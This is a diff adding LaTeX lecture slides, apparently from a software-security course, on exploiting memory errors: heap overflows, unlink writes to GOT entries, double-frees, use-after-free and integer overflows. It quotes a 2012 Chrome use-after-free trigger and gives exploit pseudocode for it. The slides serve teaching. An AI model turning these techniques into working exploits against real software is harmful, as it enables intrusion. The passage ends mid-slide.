@@ -1,0 +1,1084 @@
+% FIXME: pointer to StackGuard paper
+
+\begin{frame}
+    \titlepage
+\end{frame}
+
+{
+\setbeamercolor{background canvas}{bg=blue!40!black,fg=blue!10!white}
+\setbeamercolor{normal text}{bg=blue!40!black,fg=blue!10!white}
+\setbeamercolor{itemize/enumerate body}{fg=white}
+\setbeamercolor{itemize/enumerate subbody}{fg=white}
+\setbeamercolor{titlelike}{bg=blue!40!black,fg=blue!10!white}
+\begin{frame}<1|handout:1>[noframenumbering]{Changelog}
+    \begin{itemize}
+        \item Corrections made in this version not in first posting:
+        \begin{itemize}
+        \item 1 April 2017: slide 41: a few more \%c's would be needed to skip format string part
+        \end{itemize}
+    \end{itemize}
+\end{frame}
+}
+
+\tikzset{
+    stackBox/.style={very thick},
+    onStack/.style={thick},
+    frameOne/.style={fill=blue!15},
+    frameTwo/.style={fill=red!15},
+    markLine/.style={blue!50!black},
+    markLineB/.style={red!90!black},
+    hiLine/.style={red!90!black},
+}
+
+\begin{frame}<0>[label=inheritMemLay]{C++ inheritence: memory layout}
+\begin{tikzpicture}
+    \tikzset{
+        vt/.style={fill=blue!30},
+    }
+    \matrix[tight matrix,nodes={text width=3.8cm,text depth=.1ex,font=\small\tt},
+            label={north:InputStream},anchor=north west] (inputStream)  at (0, 0) {
+        |[vt]| vtable pointer \\
+    };
+    \matrix[tight matrix,nodes={text width=3.8cm,text depth=.1ex,font=\small\tt},
+            label={north:SeekableInputStream},anchor=north west] (seekableStream) at (4.5, 0) {
+        |[vt]| vtable pointer \\
+    };
+    \matrix[tight matrix,nodes={text width=6cm,text depth=.1ex,font=\small\tt},
+            label={north:FileInputStream},anchor=north west] (fileStream) at (9, 0) {
+        |[vt]| vtable pointer \\
+        file\_pointer \\
+    };
+    \matrix[tight matrix,nodes={text width=3.8cm,text depth=.1ex,font=\small\tt},anchor=north west] (isVT) at (0, -2) {
+        \tt slot for get\\
+    };
+    \matrix[tight matrix,nodes={text width=3.8cm,text depth=.1ex,font=\small\tt},anchor=north west] (seekVT) at (4.5, -2){
+        \tt slot for get \\
+        \tt slot for seek \\
+        \tt slot for tell \\
+    };
+    \matrix[tight matrix,nodes={text width=6cm,text depth=.1ex,font=\small\tt},anchor=north west] (fileVT) at (9, -2){
+        FileInputStream::get \\
+        FileinputStream::seek \\
+        FileInputStream::tell \\
+    };
+    \draw[thick,-Latex] (inputStream-1-1.east) -- ++(.35cm,0cm) |- (isVT-1-1.east);
+    \draw[thick,-Latex] (seekableStream-1-1.east) -- ++(.35cm,0cm) |- (seekVT-1-1.east);
+    \draw[thick,-Latex] (fileStream-1-1.east) -- ++(.35cm,0cm) |- (fileVT-1-1.east);
+\end{tikzpicture}
+\end{frame}
+
+\begin{frame}{last time: pointer subterfuge}
+    \begin{itemize}
+    \item ``pointer subterfuge''
+    \vspace{.5cm}
+    \item overwrite a pointer
+    \item overwritten pointer used to overwrite/access somewhere else
+    \item many ways this translates into exploit
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{last time: targets for pointers}
+    \begin{itemize}
+    \item many ``targets'' for attacker
+        \begin{itemize}
+            \item change important data directly
+            \item change return addresses, then have return happen
+            \item change function pointer, then have it called
+        \end{itemize}
+    \item typically: rely on code address being used soon
+        \begin{itemize}
+            \item same as stack smashing --- but not necessairily return address
+        \end{itemize}
+    \item which is used --- depends on context
+        \begin{itemize}
+            \item different situations will make different ones easier/possible
+        \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{last time: frame pointer overwrite}
+    \begin{itemize}
+        \item way off-by-one errors were a problem
+        \item many idea: frame pointer often next to buffer
+        \item frame pointer used to locate return address
+        \item changing frame pointer effectively changes return address
+    \end{itemize}
+\end{frame}
+
+\begin{frame}<1>[label=errorTypes]{beyond normal buffer overflows}
+    \begin{itemize}
+    \item pretty much every memory error is a problem
+    \item will look at exploiting:
+    \item \myemph<2>{off-by-one buffer overflows (!)}
+    \item \myemph<3>{heap buffer overflows}
+    \item \myemph<5>{double-frees}
+    \item \myemph<4>{use-after-free}
+    \item \myemph<6>{integer overflows in size calculations}
+    \end{itemize}
+\end{frame}
+
+\againframe<3>{errorTypes}
+
+\begin{frame}[fragile,label=heapOverflowInObj]{easy heap overflows}
+\begin{tikzpicture}
+\node[anchor=north east] (code) at (-1,0) {
+\begin{lstlisting}
+struct foo {
+    char buffer[100];
+    void (*func_ptr)(void);
+};
+\end{lstlisting}
+};
+\draw[stackBox] (0, 0) rectangle (4, -6);
+\draw[thick,-Latex] (-.25,-5) -- (-.25, -1) node [midway, above, sloped] {increasing addresses};
+\draw[onStack] (0, -0.5) rectangle (4, -6) node[midway,font=\small] {\texttt{buffer}};
+\draw[onStack] (0, -0) rectangle (4, -0.5) node[midway,font=\small] {\texttt{func\_ptr}};
+\end{tikzpicture}
+\end{frame}
+
+\begin{frame}[fragile,label=heapOverflowAdj]{heap overflow: adjacent allocations}
+\begin{tikzpicture}
+\lstset{language=C++,style=small}
+\node[anchor=north east] (code) at (-1,0) {
+\begin{lstlisting}
+class V {
+  char buffer[100];
+public:
+  virtual void ...;
+  ...
+};
+...
+V *first = new V(...);
+V *second = new V(...);
+strcpy(first->buffer,
+       attacker_controlled);
+\end{lstlisting}
+};
+\node[anchor=south] at (2, 0) {the heap};
+\draw[thick,-Latex] (-.25,-5) -- (-.25, -1) node [midway, above, sloped] {increasing addresses};
+\draw[stackBox,fill=black!20] (0, 0) rectangle (4, -6);
+\draw[onStack,fill=white] (0, -0.5) rectangle (4, -2.0) node[midway,font=\small] {\texttt{second}'s \texttt{buffer}};
+\draw[onStack,fill=white] (0, -2.0) rectangle (4, -2.5) node[midway,font=\small] {\texttt{second}'s \textbf{vtable}};
+
+\draw[onStack,fill=white] (0, -3.0) rectangle (4, -4.5) node[midway,font=\small] {\texttt{first}'s \texttt{buffer}};
+\draw[onStack,fill=white] (0, -4.5) rectangle (4, -5.0) node[midway,font=\small] {\texttt{first}'s \textbf{vtable}};
+
+\begin{visibleenv}<2>
+    \fill[pattern=north west lines,pattern color=red!80] (0, -2.0) rectangle (4, -4.5);
+    \node[anchor=west,font=\small,align=left] at (4.1, -3.25) {result of\\overflowing\\buffer};
+\end{visibleenv}
+\end{tikzpicture}
+\end{frame}
+
+\begin{frame}{heap smashing}
+    \begin{itemize}
+    \item ``lucky'' adjancent objects
+    \item same things possible on stack
+    \item but stack overflows had nice generic ``stack smashing''
+    \item is there an equivalent for the heap?
+    \item yes (mostly)
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{diversion: implementing malloc/new}
+    \begin{itemize}
+    \item many ways to implement malloc/new
+    \item we will talk about one common technique
+    \end{itemize}
+\end{frame}
+
+\begin{frame}[fragile,label=heapLayout]{heap object}
+\begin{tikzpicture}
+\node[anchor=north east] (code) at (-1,0) {
+\begin{lstlisting}
+struct AllocInfo {
+  bool free;
+  int size;
+  AllocInfo *prev;
+  AllocInfo *next;
+};
+\end{lstlisting}
+};
+
+\tikzset{xscale=0.9}
+\begin{scope}[overlay]
+    \draw[stackBox,fill=black!20] (0, 1) rectangle (3, -7);
+
+    \draw[onStack] (0, 1) rectangle (3, 0) node[midway,font=\small,align=center] {free space \\ (deleted obj.)};
+    \draw[onStack,fill=white] (0, -0.0) rectangle (3, -0.5) node[midway,font=\small] (freeANext) {next};
+    \draw[onStack,fill=white] (0, -0.5) rectangle (3, -1.0) node[midway,font=\small] (freeAPrev) {prev};
+    \draw[onStack,fill=white] (0, -1.0) rectangle (3, -1.5) node[midway,font=\small] (freeASize) {size/free};
+
+    \draw[very thick, red, rounded corners] (0, 1) rectangle (3, -1.5);
+
+    \draw[onStack,fill=blue!20] (0, -1.5) rectangle (3, -3.0) node[midway,font=\small,align=center] (freeBAlloc) {new'd object};
+    \draw[onStack,fill=white] (0, -3.0) rectangle (3, -3.5) node[midway,font=\small] (freeBSize) {size/free};
+    
+    \draw[very thick, red, rounded corners] (0, -1.5) rectangle (3, -3.5);
+
+    \draw[onStack] (0, -3.5) rectangle (3, -5.0) node[midway,font=\small] {free space};
+    \draw[onStack,fill=white] (0, -5.0) rectangle (3, -5.5) node[midway,font=\small] (freeCNext) {next};
+    \draw[onStack,fill=white] (0, -5.5) rectangle (3, -6.0) node[midway,font=\small] (freeCPrev) {prev};
+    \draw[onStack,fill=white] (0, -6.0) rectangle (3, -6.5) node[midway,font=\small] (freeCSize) {size/free};
+    
+    \draw[very thick, red, rounded corners] (0, -3.5) rectangle (3, -6.5);
+    
+    \draw[-Latex,blue,thick] (freeAPrev) -- ++(1.75cm,0cm) |- (freeCSize);
+    \draw[-Latex,blue,thick] (freeCNext) -- ++(2.00cm,0cm) |- (freeASize);
+    \draw[-Latex,blue,thick,opacity=0.5] (freeCPrev) -- ++(1.25cm,0cm) -- ++(0cm,-2cm);
+    \draw[-Latex,blue,thick,opacity=0.5] (freeANext) -- ++(1.75cm,0cm) -- ++(0cm,2cm);
+\end{scope}
+\draw[-Latex,line width=3pt,black!50] (3.5,-2.25) -- (5.5,-2.25) node[black,midway,above,font=\small\tt] {free};
+\begin{scope}[overlay,xshift=6cm,name prefix=sec-]
+    \draw[stackBox,fill=black!20] (0, 1) rectangle (3, -7);
+
+    \draw[onStack] (0, 1) rectangle (3, -5.0) node[midway,font=\small] {free space};
+    \draw[onStack,fill=white] (0, -5.0) rectangle (3, -5.5) node[midway,font=\small] (freeCNext) {next};
+    \draw[onStack,fill=white] (0, -5.5) rectangle (3, -6.0) node[midway,font=\small] (freeCPrev) {prev};
+    \draw[onStack,fill=white] (0, -6.0) rectangle (3, -6.5) node[midway,font=\small] (freeCSize) {size/free};
+    
+    \draw[-Latex,blue,thick,opacity=0.5] (freeCPrev) -- ++(1.25cm,0cm) -- ++(0cm,-2cm);
+    \draw[-Latex,blue,thick,opacity=0.5] (freeCNext) -- ++(1.75cm,0cm) -- ++(0cm,2cm);
+\end{scope}
+\end{tikzpicture}
+\end{frame}
+
+\begin{frame}[fragile,label=freeImpl]{implementing free()}
+\lstset{
+    style=small,
+    language=C,
+    moredelim={**[is][\btHL<2|handout:0>]{~2~}{~end~}},
+}
+\begin{lstlisting}
+int free(void *object) {
+    ...
+    block_after = object + object_size;
+    if (block_after->free) {
+        /* unlink from list */
+        new_block->size += block_after->size;
+        ~2~block_after->prev->next = block_after->next;~end~
+        block_after->next->prev = block_after->prev;
+    }
+    ...
+}
+\end{lstlisting}
+\begin{itemize}
+\item<2> \large \myemph<2>{arbitrary memory write}
+\end{itemize}
+\end{frame}
+
+\begin{frame}[fragile,label=vulnHeapSmash]{vulnerable code}
+\lstset{
+    style=small,
+    language=C,
+    moredelim={**[is][\btHL<2|handout:0>]{~2~}{~end~}},
+}
+\begin{tikzpicture}
+\node[anchor=north east] (code) at (-1,0) {
+\begin{lstlisting}
+char *buffer = malloc(100);
+... 
+~2~strcpy(buffer, attacker_supplied);~end~
+... 
+free(buffer);
+free(other_thing);
+...
+\end{lstlisting}
+};
+
+\tikzset{xscale=0.9}
+\begin{scope}[overlay]
+    \draw[stackBox,fill=black!20] (0, 1) rectangle (3, -7);
+
+    \begin{pgfonlayer}{fg}
+    \draw[very thick, orange, rounded corners] (0, 1) rectangle (3, -1.5);
+    \draw[very thick, orange, rounded corners] (0, -1.5) rectangle (3, -3.5);
+    \draw[very thick, orange, rounded corners] (0, -3.5) rectangle (3, -6.5);
+    \end{pgfonlayer}
+
+    \draw[onStack] (0, 1) rectangle (3, 0) node[midway,font=\small] {free space};
+    \draw[onStack,fill=white] (0, -0.0) rectangle (3, -0.5) node[midway,font=\small] (freeANext) {next};
+    \draw[onStack,fill=white] (0, -0.5) rectangle (3, -1.0) node[midway,font=\small] (freeAPrev) {prev};
+    \draw[onStack,fill=white] (0, -1.0) rectangle (3, -1.5) node[midway,font=\small] (freeASize) {size/free};
+
+    \draw[onStack,fill=blue!20] (0, -1.7) rectangle (3, -3.0) node[midway,font=\small,align=center] (freeBAlloc) {alloc'd object};
+    \fill[pattern color=red,pattern=north west lines] (0, -0.0) rectangle (3, -3.0);
+    \draw[onStack,fill=white] (0, -3.0) rectangle (3, -3.5) node[midway,font=\small] (freeBSize) {size/free};
+
+    \draw[onStack] (0, -3.5) rectangle (3, -5.0) node[midway,font=\small] {free space};
+    \draw[onStack,fill=white] (0, -5.0) rectangle (3, -5.5) node[midway,font=\small] (freeCNext) {next};
+    \draw[onStack,fill=white] (0, -5.5) rectangle (3, -6.0) node[midway,font=\small] (freeCPrev) {prev};
+    \draw[onStack,fill=white] (0, -6.0) rectangle (3, -6.5) node[midway,font=\small] (freeCSize) {size/free};
+    
+    \draw[-Latex,blue,thick] (freeAPrev) -- ++(1.75cm,0cm) -- ++ (0cm, -1cm) -- ++ (4cm,0cm); %|- (freeCSize);
+    \draw[-Latex,blue,thick] (freeCNext) -- ++(2.00cm,0cm) -- ++ (0cm, 1cm) -- ++ (4cm,0cm); % |- (freeASize);
+    \draw[-Latex,blue,thick,opacity=0.5] (freeCPrev) -- ++(1.25cm,0cm) -- ++(0cm,-2cm);
+    \draw[-Latex,blue,thick,opacity=0.5] (freeANext) -- ++(1.75cm,0cm) -- ++(0cm,2cm);
+
+    \begin{visibleenv}<2->
+        \begin{scope}[xshift=-5cm,yshift=-3cm]
+        \tikzset{gotBox/.style={thick,fill=orange!30}}
+        \draw[gotBox] (0, -1) rectangle (4, -1.5) node[midway,font=\small] (freeEntry) {GOT entry: free};
+        \draw[gotBox] (0, -1.5) rectangle (4, -2) node[midway,font=\small] {GOT entry: malloc };
+        \draw[gotBox] (0, -2) rectangle (4, -2.5) node[midway,font=\small] (printfEntry) {GOT entry: printf };
+        \draw[gotBox] (0, -2.5) rectangle (4, -3.0) node[midway,font=\small] {GOT entry: fopen };
+        \end{scope}
+        \draw[-Latex,red,ultra thick,dashed] (freeAPrev) -- ++(-2cm,0cm) |- ([yshift=-.25cm]printfEntry.east);
+        \draw[-Latex,red,ultra thick,dashed] (freeANext) -- ++(-2.5cm,0cm) -- ++(0cm,-2.5cm) -- ++(-.5cm,0cm) node [black,solid,draw,left,align=left,fill=white] (scode) {shellcode};
+    \end{visibleenv}
+    \begin{visibleenv}<3->
+        \begin{scope}[xshift=-5cm,yshift=-3cm]
+        \draw[blue,opacity=0.8] (-2, -2) rectangle (0, -2.5) node[midway,font=\small] {size/free};
+        \draw[blue,opacity=0.8] (-2, -1.5) rectangle (0, -2) node[midway,font=\small] {prev};
+        \draw[blue,opacity=0.8] (-2, -1) rectangle (0, -1.5) node[midway,font=\small] {next};
+        \end{scope}
+        \draw[-Latex,blue,ultra thick,dotted] (freeEntry.north) -- ++(0cm,.1cm) -| (scode.south);
+    \end{visibleenv}
+\end{scope}
+\end{tikzpicture}
+\end{frame}
+
+\againframe<5>{errorTypes}
+
+\begin{frame}[fragile,label=dblFree]{double-frees}
+\lstset{
+    style=small,
+    language=C,
+    moredelim={**[is][\btHL<2|handout:0>]{~2~}{~end~}},
+    moredelim={**[is][\btHL<3|handout:0>]{~3~}{~end~}},
+    moredelim={**[is][\btHL<4|handout:0>]{~4~}{~end~}},
+}
+\begin{tikzpicture}
+\node[anchor=north east] (code) at (-1,0) {
+\begin{lstlisting}
+~2~free(thing);~end~
+~2~free(thing);~end~
+char *~2~p = malloc(...);~end~
+// p points to next/prev
+//   on list of avail.
+//   blocks
+strcpy(p, attacker_controlled);
+malloc(...);
+char *q = malloc(...);
+// q points to attacker-
+//   chosen address
+strcpy(q, attacker_controlled2);
+...
+\end{lstlisting}
+};
+
+\tikzset{xscale=0.9}
+\begin{scope}[overlay]
+    \draw[stackBox,fill=black!20] (0, 1) rectangle (3, -7);
+
+    \draw[onStack] (0, 1) rectangle (3, 0) node[midway,font=\small] {free space};
+    \draw[onStack,fill=white] (0, -0.0) rectangle (3, -0.5) node[midway,font=\small] (freeANext) {next};
+    \draw[onStack,fill=white] (0, -0.5) rectangle (3, -1.0) node[midway,font=\small] (freeAPrev) {prev};
+    \draw[onStack,fill=white] (0, -1.0) rectangle (3, -1.5) node[midway,font=\small] (freeASize) {size};
+
+    \draw[onStack,fill=blue!20] (0, -1.7) rectangle (3, -3.0) node[midway,font=\small,align=center] (freeBAlloc) {alloc'd object};
+    \draw[onStack,fill=white] (0, -3.0) rectangle (3, -3.5) node[midway,font=\small] (freeBSize) {size};
+
+    \draw[onStack,fill=yellow!20] (0, -3.5) rectangle (3, -6.0) node[midway,font=\small,align=center,yshift=.5cm] {alloc'd object\\
+                \tt thing\only<2->{/p}};
+    \begin{visibleenv}<2->
+    \draw[onStack,fill=yellow!10,dashed] (0, -5.5) rectangle (3, -6.0) node[midway,font=\small] (freeCPrev) {prev};
+    \draw[onStack,fill=yellow!10,dashed] (0, -5.0) rectangle (3, -5.5) node[midway,font=\small] (freeCNext) {next};
+    \draw[-Latex,blue,thick,opacity=0.5] (freeCPrev) -- ++(1.75cm,0cm) -- ++(0cm,-2cm);
+    \draw[-Latex,blue,thick,opacity=0.5] (freeCNext) -- ++(2.25cm,0cm) -- ++(0cm,2cm);
+    \end{visibleenv}
+    \draw[onStack,fill=white] (0, -6.0) rectangle (3, -6.5) node[midway,font=\small] (freeCSize) {size};
+    
+    \draw[-Latex,blue,thick,opacity=0.5] (freeAPrev) -- ++(1.75cm,0cm) -- ++(0cm,-2cm);
+    \draw[-Latex,blue,thick,opacity=0.5] (freeANext) -- ++(2.25cm,0cm) -- ++(0cm,2cm);
+\end{scope}
+    \begin{visibleenv}<3>
+        \node[draw=red, ultra thick, anchor=east,align=left,fill=white] at (-.5, -4) {
+            malloc returns something \myemph{still on free list} \\
+            because double-free made \myemph{loop} in linked list
+        };
+    \end{visibleenv}
+\end{tikzpicture}
+\end{frame}
+
+
+% FIXME: as pictures
+\begin{frame}[fragile,label=dblFreeExpand]{double-free expansion}
+\lstset{
+    style=smaller,
+    language=C,
+    moredelim={**[is][\btHL<2|handout:0>]{~2~}{~end~}},
+    moredelim={**[is][\btHL<3|handout:0>]{~3~}{~end~}},
+    moredelim={**[is][\btHL<4|handout:0>]{~4~}{~end~}},
+    moredelim={**[is][\btHL<5|handout:0>]{~5~}{~end~}},
+    moredelim={**[is][\btHL<6|handout:0>]{~6~}{~end~}},
+}
+\begin{tikzpicture}
+\node[anchor=north east] (code) at (-1,0) {
+\begin{lstlisting}
+// free/delete 1:
+~2~double_freed->next = first_free;~end~
+~2~first_free = chunk;~end~
+// free/delete 2:
+~3~double_freed->next = first_free;~end~
+~3~first_free = chunk~end~
+// malloc/new 1:
+~4~result1 = first_free;~end~
+~4~first_free = first_free->next;~end~
+// + overwrite:
+~4~strcpy(result1, ...);~end~
+// malloc/new 2:
+~5~first_free = first_free->next;~end~
+// malloc/new 3: 
+result3 = first_free;
+strcpy(result3, ...);
+\end{lstlisting}
+};
+\draw[stackBox] (0,0) rectangle (5, -2);
+\draw[onStack,fill=blue!20] (0,0) rectangle (5, -1) node[midway,font=\small] {next / double free'd object};
+\draw[onStack] (0,-1) rectangle (5, -2) node[midway,font=\small] {size};
+\draw[stackBox] (0, -4) rectangle (5, -5) node[midway,font=\small,align=center] {first\_free \\ (global)};
+\draw[stackBox,dashed] (0.5, -2.5) rectangle (5.5, -3.5) node[midway,font=\small,align=center] {(original first free)};
+
+\begin{visibleenv}<1>
+\draw[-Latex,blue,thick] (0, -4.5) -- ++(-0.5cm,0cm) |- (0.5, -3);
+\end{visibleenv}
+\begin{visibleenv}<2-4>
+\draw[-Latex,blue,thick] (0, -4.5) -- ++(-0.5cm,0cm) |- (0, -1.5);
+\end{visibleenv}
+\begin{visibleenv}<2>
+\draw[-Latex,blue,thick] (5, -0.5) -- ++(1.5cm,0cm) |- (5.5, -3);
+\end{visibleenv}
+
+\begin{visibleenv}<3->
+\draw[-Latex,blue,thick] (5, -0.5) -- ++(0.5cm,0cm) |- (5, -1.5);
+\end{visibleenv}
+
+\begin{visibleenv}<4->
+\fill[pattern=north west lines,pattern color=red] (0, 0) rectangle (5, -1);
+\draw[red,dashed,ultra thick,-Latex] (5,-0.5) -- ++(1cm, 0cm) |- (3, -5.5);
+\draw[stackBox,fill=orange!30] (0, -5.25) rectangle (3, -6.25) node[midway,font=\small] {GOT entry: free};
+\end{visibleenv}
+\begin{visibleenv}<4->
+\node[overlay,text=black,draw=red!80,thick,font=\small\tt,anchor=south] at (3, 0) { first/second malloc };
+\end{visibleenv}
+
+\begin{visibleenv}<5->
+\draw[-Latex,blue,thick] (0, -4.5) -- ++(-1cm, 0cm) |- (0, -5.75);
+\node[text=black,draw=red!80,thick,font=\small\tt,anchor=north west] at (3, -6) { third malloc };
+\end{visibleenv}
+\end{tikzpicture}
+\end{frame}
+
+\begin{frame}{double-free notes}
+    \begin{itemize}
+    \item this attack has apparently not been possible for a while
+    \item most malloc/new's \myemph{check for double-frees} explicitly
+        \begin{itemize}
+        \item (e.g., look for a bit in {\tt size} data)
+        \end{itemize}
+    \item prevents this issue --- also catches programmer errors
+    \item pretty cheap
+    \end{itemize}
+\end{frame}
+
+% FIXME more stuff
+
+\againframe<4>{errorTypes}
+
+\begin{frame}[fragile,label=vulnUAF]{vulnerable code}
+\lstset{
+    language=C++,
+    style=smaller,
+    moredelim={**[is][\btHL<2|handout:0>]{~2~}{~end~}},
+}
+\begin{tikzpicture}
+\node[anchor=north east] (code) at (-1,0) {
+\begin{lstlisting}
+class Foo {
+    ...
+};
+Foo *the_foo;
+the_foo = new Foo;
+...
+delete the_foo;
+...
+something_else = new Bar(...);
+the_foo->something();
+\end{lstlisting}
+};
+\node[draw,anchor=north west,align=left] at (-3,0) {
+    {\tt something\_else} likely where {\tt the\_foo} was
+};
+\begin{visibleenv}<2>
+\draw[stackBox] (0, -2) rectangle (3, -5);
+\draw[stackBox] (4, -2) rectangle (7, -5);
+\draw[onStack,fill=blue!20] (0, -2) rectangle (3, -3) node[midway,align=center,font=\small] { vtable ptr (Foo) };
+\draw[onStack,fill=blue!20] (0, -3) rectangle (3, -5) node[midway,align=center,font=\small] {data for Foo };
+\draw[onStack,fill=yellow!20] (4, -2) rectangle (7, -3) node[midway,align=center,font=\small] { vtable ptr (Bar)? \\
+                                                                                   other data? };
+\draw[onStack,fill=yellow!20] (4, -3) rectangle (7, -5) node[midway,align=center,font=\small] { data for Bar  };
+\end{visibleenv}
+\end{tikzpicture}
+\end{frame}
+
+\againframe<2>{inheritMemLay}
+
+\begin{frame}{exploiting use after-free}
+\begin{itemize}
+\item trigger many ``bogus'' frees; then
+\item allocate many things of same size with ``right'' pattern  
+    \begin{itemize}
+    \item pointers to shellcode?
+    \item pointers to pointers to {\tt system()}?
+    \item objects with something useful in VTable entry?
+    \end{itemize}
+\item trigger use-after-free thing
+\end{itemize}
+\end{frame}
+
+\begin{frame}{real UAF exploitable bug}
+    \begin{itemize}
+        \item 2012 bug in Google Chrome
+        \item exploitable via JavaScript
+        \item discovered/proof of concept by PinkiePie
+        \item allowed arbitrary code execution via VTable manipulation
+        \item \ldots despite exploit mitigations (we'll revisit this later)
+    \end{itemize}
+\end{frame}
+
+
+\begin{frame}[fragile,label=UAFTriggering]{UAF triggering code}
+\lstset{
+    language=JavaScript,
+    style=smaller,
+    moredelim={**[is][\btHL<2|handout:0>]{~2~}{~end~}},
+    moredelim={**[is][\btHL<3-4|handout:0>]{~3~}{~end~}},
+    moredelim={**[is][\btHL<4|handout:0>]{~4~}{~end~}},
+}
+\begin{tikzpicture}
+\node[anchor=north east] (code) at (0, 0) {
+\begin{lstlisting}
+// in HTML near this JavaScript:
+// <video id="vid"> (video player element)
+function source_opened() {
+  buffer = ms.addSourceBuffer('video/webm; codecs="vorbis,vp8"');
+  ~2~vid.parentNode.removeChild(vid);~end~
+  gc(); // force garbage collector to run now
+  // garbage collector frees unreachable objects
+  // (would be run automatically, eventually, too)
+  // buffer now internally refers to delete'd player object
+  ~3~buffer.timestampOffset = 42;~end~
+}
+ms = new WebKitMediaSource();
+ms.addEventListener('webkitsourceopen', source_opened);
+vid.src = window.URL.createObjectURL(ms);
+\end{lstlisting}
+};
+    \begin{visibleenv}<4->
+        \node[fill=white,opacity=0.6,fit=(code)] {};
+        \node[draw=red,ultra thick,anchor=north east,fill=white,overlay] (cppCode) at (-.25, .125) { 
+\lstset{
+    language=C++,
+    style=smaller,
+    moredelim={**[is][\btHL<2|handout:0>]{~2~}{~end~}},
+    moredelim={**[is][\btHL<3-4|handout:0>]{~3~}{~end~}},
+    moredelim={**[is][\btHL<4|handout:0>]{~4~}{~end~}},
+    moredelim={**[is][\btHL<5|handout:0>]{~5~}{~end~}},
+}
+\begin{lstlisting}
+// implements JavaScript buffer.timestampOffset = 42
+void SourceBuffer::setTimestampOffset(...) {
+     if (m_source->setTimestampOffset(...))
+        ...
+}
+bool MediaSource::setTimestampOffset(...) {
+    // m_player was deleted when video player element deleted
+    // but this call does *not* use a VTable
+    if (!~4~m_player~end~->sourceSetTimestampOffset(id, offset)) 
+        ...
+}
+bool MediaPlayer::sourceSetTimestampOffset(...) {
+    // m_private deleted when MediaPlayer deleted
+    // this *is* a VTable-based call
+    return ~5~m_private~end~->sourceSetTimestampOffset(id, offset);
+}
+\end{lstlisting}
+    };
+    \end{visibleenv}
+\end{tikzpicture}
+\imagecredit{via \url{https://bugs.chromium.org/p/chromium/issues/detail?id=162835}}
+\end{frame}
+
+\begin{frame}[fragile,label=theExploit]{UAF exploit (pseudocode)}
+\begin{lstlisting}[language=JavaScript,style=smaller]
+... /* use information leaks to find relevant addresses */ 
+buffer = ms.addSourceBuffer('video/webm; codecs="vorbis,vp8"');
+vid.parentNode.removeChild(vid);
+vid = null;
+gc();
+// allocate object to replace m_private
+var array = new Uint32Array(168/4);
+// allocate object to replace m_player
+// type chosen to keep m_private pointer unchanged
+rtc = new webkitRTCPeerConnection({'iceServers': []});
+ ... /* fill ia with chosen addresses */
+// trigger VTable Call that uses chosen address
+buffer.timestampOffset = 42;
+\end{lstlisting}
+\end{frame}
+
+\begin{frame}{missing pieces: information disclosure}
+    \begin{itemize}
+        \item need to learn address to set VTable pointer to
+        \item (and other addresses to use)
+        \item allocate types other than \texttt{Uint32Array}
+        \item rely on confusing between different types, e.g.:
+    \end{itemize}
+    \begin{tikzpicture}
+    \matrix[tight matrix,nodes={text width=6.8cm,text depth=.1ex,font=\small\tt},anchor=north west,
+            label={north:{\tt MediaPlayer} (deleted but used)}] (PlayerVT) at (0, 0) {
+        m\_private {\normalfont (pointer to PlayerImpl)} \\
+        m\_timestampOffset {\normalfont (double)} \\
+    };
+    \matrix[tight matrix,nodes={text width=6.8cm,text depth=.1ex,font=\small\tt},anchor=north west,
+            label={north:{\tt Something} (replacement)}] (SomethingVT) at (8, 0) {
+        \ldots \\
+        m\_buffer {\normalfont (pointer)} \\
+    };
+    \end{tikzpicture}
+\end{frame}
+
+\begin{frame}{use-after-free easy cases}
+\begin{itemize}
+    \item common problem for JavaScript implementations
+    \item use-after-free'd object often some complex C++ object
+        \begin{itemize}
+            \item example: representation of video stream
+        \end{itemize}
+    \item exploits can \myemph{choose type of object that replaces}
+        \begin{itemize}
+            \item allocate that kind of object in JS
+        \end{itemize}
+    \item can often arrange to read/write vtable pointer
+        \begin{itemize}
+            \item depends on layout of thing created
+            \item easy examples: string, array of floating point numbers
+        \end{itemize}
+\end{itemize}
+\end{frame}
+
+\againframe<6>{errorTypes}
+
+\begin{frame}[fragile,label=intOverflowEx]{integer overflow example}
+\lstset{
+    language=C,
+    morekeywords=item,
+    style=smaller,
+    moredelim={**[is][\btHL<2|handout:0>]{~2~}{~end~}},
+}
+\begin{tikzpicture}
+\node[anchor=north east] (code) at (-1,0) {
+\begin{lstlisting}
+item *load_items(int len) {
+  int total_size = ~2~len * sizeof(item);~end~
+  if (total_size >= LIMIT) {
+    return NULL;
+  }
+  item *items = malloc(total_size);
+  for (int i = 0; i < len; ++i) {
+    int failed = read_item(&items[i]);
+    if (failed) {
+      free(items);
+      return NULL;
+    }
+  }
+  return items;
+}
+\end{lstlisting}
+};
+\node[align=left,anchor=north west,font=\small] (t1) at (0,0) {
+    {\tt len} = {\tt 0x4000 0001} \\
+    {\tt sizeof(item)} = {\tt 0x10}
+};
+\node[align=left,anchor=north west,font=\small] (t2) at (t1.south west) {
+    {\tt total\_size} = \\
+    {\tt 0x\textcolor{red}{4} 0000 0010} \\
+};
+\end{tikzpicture}
+\end{frame}
+
+\begin{frame}[fragile,label=intUOEx]{integer under/overflow: real example}
+    \begin{itemize}
+        \item part of another Google Chrome exploit by Pinkie Pie:
+    \end{itemize}
+    \begin{lstlisting}[language=C,style=small,morekeywords={uint32,size_t}]
+// In graphics command processing code:
+uint32 ComputeMaxResults(size_t size_of_buffer) {
+    return (size_of_buffer - sizeof(uint32)) / sizeof(T);
+} 
+size_t ComputeSize(size_t num_results) {
+    return sizeof(T) * num_results + sizeof(uint32);
+} 
+// exploit: size_of_buffer < sizeof(uint32)
+\end{lstlisting}
+    \begin{itemize}
+        \item result: write 8 bytes after buffer 
+            \begin{itemize}
+                \item sometimes overwrites data pointer
+            \end{itemize}
+    \end{itemize}
+\imagecredit{via \url{https://blog.chromium.org/2012/05/tale-of-two-pwnies-part-1.html}}
+\end{frame}
+
+\begin{frame}{special exploits}
+    \begin{itemize}
+        \item format string exploits
+        \item topic of next homework
+    \end{itemize}
+\end{frame}
+
+\begin{frame}[fragile,label=formatStringIntro]{format string exploits}
+\lstset{language=C}
+\begin{lstlisting}
+printf("The command you entered ");
+printf(command);
+printf("was not recognized.\n");
+\end{lstlisting}
+    \begin{itemize}
+        \item<2> what if \texttt{command} is {\tt \%s}?
+    \end{itemize}
+\end{frame}
+
+% FIXME: demo based on this looking at registers in GDB
+
+\begin{frame}[fragile,label=viewingTheStack]{viewing the stack}
+\lstset{
+    language={},
